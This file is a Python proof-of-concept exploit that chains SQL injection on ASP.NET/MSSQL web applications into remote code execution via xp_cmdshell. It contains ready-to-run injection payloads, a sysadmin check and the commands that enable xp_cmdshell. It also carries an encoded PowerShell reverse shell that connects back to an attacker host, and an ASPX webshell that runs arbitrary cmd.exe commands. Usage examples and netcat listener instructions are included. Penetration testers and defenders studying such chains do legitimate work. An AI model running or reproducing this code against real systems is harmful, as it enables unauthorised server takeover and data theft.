#!/usr/bin/env python3
"""
MSSQL SQL Injection to xp_cmdshell RCE PoC
CVE: N/A (Common vulnerability pattern)
Target: ASP.NET/MSSQL web applications with SQL injection
Vulnerability: SQL Injection → xp_cmdshell → Remote Code Execution

Reference:
- https://www.tarlogic.com/blog/red-team-tales-0x01/
- https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
- https://book.hacktricks.xyz/pentesting-web/sql-injection#mssql

Exploit Flow:
1. Identify SQL injection vulnerability
2. Confirm MSSQL database via error messages or time-based detection
3. Check if current user has sysadmin privileges
4. Enable xp_cmdshell via stacked queries
5. Execute OS commands via xp_cmdshell
6. Verify RCE (ping callback, reverse shell, or webshell write)
"""

import argparse
import requests
import sys
import time
from dataclasses import dataclass, field
from typing import Optional, List
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import our custom sqli module
import os
import importlib.util
sqli_module_path = os.path.join(os.path.dirname(__file__), "..", "advanced-skeleton", "modules", "sqli.py")
spec = importlib.util.spec_from_file_location("sqli", sqli_module_path)
sqli = importlib.util.module_from_spec(spec)
spec.loader.exec_module(sqli)
MSSQLDialect = sqli.MSSQLDialect

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """MSSQL SQLi to xp_cmdshell exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/product.aspx"
    param_name: str = "id"
    injection_point: str = "1{payload}"  # {payload} will be replaced

    # Attacker configuration
    attacker_ip: str
    attacker_port: int

    # Exploit configuration
    command_type: str = "ping"  # ping, whoami, reverse_shell, webshell
    webshell_path: str = ""  # For webshell writes (e.g., C:\\inetpub\\wwwroot\\shell.aspx)
    proxy: Optional[str] = None
    delay: int = 5  # For time-based SQLi verification

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    dialect: MSSQLDialect = field(default_factory=MSSQLDialect, repr=False)
    sqli_confirmed: bool = field(default=False, repr=False)
    is_sysadmin: bool = field(default=False, repr=False)
    xp_cmdshell_enabled: bool = field(default=False, repr=False)
    rce_confirmed: bool = field(default=False, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            param_name=args.param_name,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            command_type=args.command,
            webshell_path=args.webshell_path,
            proxy=args.proxy,
            delay=args.delay,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        """Construct full target URL including endpoint."""
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None


# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="MSSQL SQL Injection to xp_cmdshell RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic ping callback test
  %(prog)s 192.168.1.10 80 10.10.14.5 4444

  # Reverse shell
  %(prog)s 192.168.1.10 80 10.10.14.5 4444 --command reverse_shell

  # Write ASPX webshell
  %(prog)s 192.168.1.10 80 10.10.14.5 4444 --command webshell \\
    --webshell-path "C:\\inetpub\\wwwroot\\shell.aspx"

  # Custom endpoint and parameter
  %(prog)s 192.168.1.10 80 10.10.14.5 4444 \\
    --endpoint /search.aspx --param query
"""
    )

    # Target configuration
    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/product.aspx",
                            help="Vulnerable endpoint path (default: /product.aspx)")
    target_group.add_argument("--param-name", default="id",
                            help="Vulnerable parameter name (default: id)")

    # Attacker configuration
    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP for callbacks/reverse shell")
    attacker_group.add_argument("listening_port", type=int, help="Attacker listening port")

    # Exploit configuration
    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--command", choices=["ping", "whoami", "reverse_shell", "webshell"],
                             default="ping", help="Command type to execute (default: ping)")
    exploit_group.add_argument("--webshell-path", default="",
                             help="Path to write webshell (e.g., C:\\inetpub\\wwwroot\\shell.aspx)")
    exploit_group.add_argument("--delay", type=int, default=5,
                             help="Delay for time-based SQLi verification (default: 5)")

    # Optional
    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")

    return parser.parse_args()


# ============================================================================
# SQL INJECTION HELPERS
# ============================================================================

def send_sqli_payload(ctx: ExploitContext, payload: str, check_delay: bool = False) -> requests.Response:
    """
    Send SQL injection payload to target.

    Args:
        ctx: Exploit context
        payload: SQL injection payload
        check_delay: If True, measure response time

    Returns:
        Response object
    """
    # Build injection string
    injection = ctx.injection_point.replace("{payload}", payload)

    # URL encode
    params = {ctx.param_name: injection}

    start_time = time.time()
    response = ctx.session.get(
        ctx.get_target_url(),
        params=params,
        proxies=ctx.get_proxies(),
        timeout=ctx.delay + 10,
        verify=False
    )
    elapsed = time.time() - start_time

    if check_delay:
        print(f"    Response time: {elapsed:.2f}s")
        if elapsed >= ctx.delay:
            print(f"[+] Delay detected! Time-based SQLi confirmed")

    return response


def execute_stacked_query(ctx: ExploitContext, sql: str) -> requests.Response:
    """
    Execute stacked SQL query.

    Args:
        ctx: Exploit context
        sql: SQL query to execute

    Returns:
        Response object
    """
    # MSSQL stacked query: '; <SQL_HERE>--
    payload = f"'; {sql}--"
    print(f"[*] Executing: {sql}")
    return send_sqli_payload(ctx, payload)


# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """
    Stage 1: Reconnaissance and SQLi detection.

    Args:
        ctx: Exploit context

    Returns:
        True if SQLi confirmed
    """
    print("\n[*] Stage 1: Reconnaissance & SQLi Detection")

    try:
        # Test basic connectivity
        print(f"[*] Testing connectivity to {ctx.get_target_url()}")
        response = ctx.session.get(
            ctx.get_target_url(),
            params={ctx.param_name: "1"},
            proxies=ctx.get_proxies(),
            timeout=10,
            verify=False
        )
        print(f"[+] Target is reachable (HTTP {response.status_code})")

        # Test for SQL injection with WAITFOR DELAY
        print(f"\n[*] Testing for SQL injection with time-based technique")
        print(f"[*] Sending WAITFOR DELAY payload (expect {ctx.delay}s delay)")

        payload = f"'; WAITFOR DELAY '00:00:0{ctx.delay}'--"
        response = send_sqli_payload(ctx, payload, check_delay=True)

        ctx.sqli_confirmed = True
        print("[+] SQL injection confirmed!")

        # Try to detect MSSQL via error message
        print(f"\n[*] Attempting to trigger MSSQL error message")
        payload = "'"
        response = send_sqli_payload(ctx, payload)

        if any(indicator in response.text for indicator in ["Microsoft SQL", "ODBC SQL Server", "SQLServer", "[Microsoft][ODBC"]):
            print("[+] MSSQL database confirmed via error message!")
        else:
            print("[!] No explicit MSSQL error, but time-based detection succeeded")

        return True

    except requests.exceptions.Timeout:
        print("[+] Request timed out during delay test - SQLi likely present!")
        ctx.sqli_confirmed = True
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False


def stage_privilege_check(ctx: ExploitContext) -> bool:
    """
    Stage 2: Check if current user is sysadmin.

    Args:
        ctx: Exploit context

    Returns:
        True if privilege check completed
    """
    print("\n[*] Stage 2: Privilege Check")

    if not ctx.sqli_confirmed:
        print("[-] SQLi not confirmed, cannot check privileges")
        return False

    # Check sysadmin using time-based approach
    print("[*] Checking if current user has sysadmin privileges")
    print(f"[*] If delay occurs, user is sysadmin")

    # If sysadmin, trigger delay
    payload = f"'; IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '00:00:0{ctx.delay}'--"

    try:
        start_time = time.time()
        response = send_sqli_payload(ctx, payload)
        elapsed = time.time() - start_time

        print(f"    Response time: {elapsed:.2f}s")

        if elapsed >= ctx.delay:
            print("[+] Current user has sysadmin privileges!")
            ctx.is_sysadmin = True
            return True
        else:
            print("[-] Current user does NOT have sysadmin privileges")
            print("[!] xp_cmdshell requires sysadmin - exploitation may fail")
            return False

    except requests.exceptions.Timeout:
        print("[+] Timeout detected - user is likely sysadmin!")
        ctx.is_sysadmin = True
        return True


def stage_enable_xp_cmdshell(ctx: ExploitContext) -> bool:
    """
    Stage 3: Enable xp_cmdshell.

    Args:
        ctx: Exploit context

    Returns:
        True if xp_cmdshell enabled
    """
    print("\n[*] Stage 3: Enable xp_cmdshell")

    if not ctx.is_sysadmin:
        print("[!] Warning: Proceeding without sysadmin confirmation")

    # Execute each command to enable xp_cmdshell
    enable_commands = ctx.dialect.enable_xp_cmdshell()

    for cmd in enable_commands:
        try:
            execute_stacked_query(ctx, cmd)
            time.sleep(1)  # Brief delay between commands
        except Exception as e:
            print(f"[!] Warning: {e}")

    print("[+] xp_cmdshell enable commands sent")
    ctx.xp_cmdshell_enabled = True

    return True


def stage_exploit(ctx: ExploitContext) -> bool:
    """
    Stage 4: Execute commands via xp_cmdshell.

    Args:
        ctx: Exploit context

    Returns:
        True if command execution successful
    """
    print("\n[*] Stage 4: Command Execution")

    if not ctx.xp_cmdshell_enabled:
        print("[-] xp_cmdshell not enabled")
        return False

    # Generate command based on type
    if ctx.command_type == "ping":
        # Ping callback (4 packets for Windows)
        cmd = f"ping -n 4 {ctx.attacker_ip}"
        print(f"[*] Executing ping callback to {ctx.attacker_ip}")

    elif ctx.command_type == "whoami":
        # whoami - output won't be visible but confirms execution
        cmd = "whoami"
        print(f"[*] Executing whoami (no output visible via blind SQLi)")

    elif ctx.command_type == "reverse_shell":
        # PowerShell reverse shell
        ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{ctx.attacker_ip}',{ctx.attacker_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

        # Encode for PowerShell -EncodedCommand
        import base64
        encoded_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode()

        cmd = f"powershell -EncodedCommand {encoded_ps}"
        print(f"[*] Executing PowerShell reverse shell to {ctx.attacker_ip}:{ctx.attacker_port}")

    elif ctx.command_type == "webshell":
        if not ctx.webshell_path:
            print("[-] --webshell-path required for webshell command")
            return False

        # Write ASPX webshell
        webshell_content = '''<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]).StandardOutput.ReadToEnd());%>'''

        # Escape single quotes for SQL
        escaped_content = webshell_content.replace("'", "''")

        cmd = f"echo {escaped_content} > {ctx.webshell_path}"
        print(f"[*] Writing webshell to {ctx.webshell_path}")

    else:
        cmd = ctx.command_type

    # Execute via xp_cmdshell
    xp_cmd = ctx.dialect.execute_command(cmd)

    try:
        execute_stacked_query(ctx, xp_cmd)
        print(f"[+] Command executed via xp_cmdshell")
        return True
    except Exception as e:
        print(f"[-] Command execution failed: {e}")
        return False


def stage_verify(ctx: ExploitContext) -> bool:
    """
    Stage 5: Verify RCE.

    Args:
        ctx: Exploit context

    Returns:
        True if RCE verified
    """
    print("\n[*] Stage 5: Verification")

    if ctx.command_type == "ping":
        print(f"[*] Verification method: Ping callback")
        print(f"[!] Monitor for ICMP packets from {ctx.target_ip}")
        print(f"[!] On attacker machine, run:")
        print(f"    sudo tcpdump -i any icmp and src {ctx.target_ip}")
        print(f"[*] If you see 4 ping packets, RCE is confirmed")

    elif ctx.command_type == "whoami":
        print(f"[*] Verification method: Manual")
        print(f"[!] whoami output is not visible via blind SQLi")
        print(f"[!] If no errors occurred, command likely executed")

    elif ctx.command_type == "reverse_shell":
        print(f"[*] Verification method: Reverse shell")
        print(f"[!] Check your listener on {ctx.attacker_ip}:{ctx.attacker_port}")
        print(f"[!] If no shell received, ensure:")
        print(f"    - Listener is running (nc -lvnp {ctx.attacker_port})")
        print(f"    - No firewall blocking {ctx.attacker_port}")
        print(f"    - Target can reach {ctx.attacker_ip}")

    elif ctx.command_type == "webshell":
        print(f"[*] Verification method: Webshell")
        webshell_url = f"{ctx.get_base_url()}/{ctx.webshell_path.split('\\')[-1]}"
        print(f"[!] Access webshell at: {webshell_url}?c=whoami")
        print(f"[!] Test with: curl \"{webshell_url}?c=whoami\"")

    # Manual verification
    response = input("\n[?] Did you verify RCE? (y/n): ")
    if response.lower() == 'y':
        ctx.rce_confirmed = True
        print("[+] RCE confirmed!")
        return True
    else:
        print("[!] RCE not confirmed - check verification steps")
        return False


# ============================================================================
# MAIN
# ============================================================================

def main():
    """Main execution."""
    print("[+] MSSQL SQL Injection to xp_cmdshell RCE PoC")
    print("[+] Target: ASP.NET/MSSQL applications with SQL injection")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    print(f"\n[*] Configuration:")
    print(f"    Target: {ctx.get_target_url()}")
    print(f"    Parameter: {ctx.param_name}")
    print(f"    Attacker: {ctx.attacker_ip}:{ctx.attacker_port}")
    print(f"    Command: {ctx.command_type}")

    try:
        # Stage 1: Recon & SQLi detection
        if not stage_recon(ctx):
            print("\n[-] SQL injection not detected")
            sys.exit(1)

        # Stage 2: Privilege check
        if not stage_privilege_check(ctx):
            response = input("\n[?] Continue without sysadmin privileges? (y/n): ")
            if response.lower() != 'y':
                print("[!] Exploitation aborted")
                sys.exit(1)

        # Stage 3: Enable xp_cmdshell
        if not stage_enable_xp_cmdshell(ctx):
            print("\n[-] Failed to enable xp_cmdshell")
            sys.exit(1)

        # Stage 4: Exploit
        if not stage_exploit(ctx):
            print("\n[-] Command execution failed")
            sys.exit(1)

        # Stage 5: Verify
        if not stage_verify(ctx):
            print("\n[!] Exploitation completed but RCE not verified")
            print("[!] Manual verification required")
            sys.exit(1)

        print("\n[+] Exploitation successful!")
        print(f"[+] RCE achieved via xp_cmdshell")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
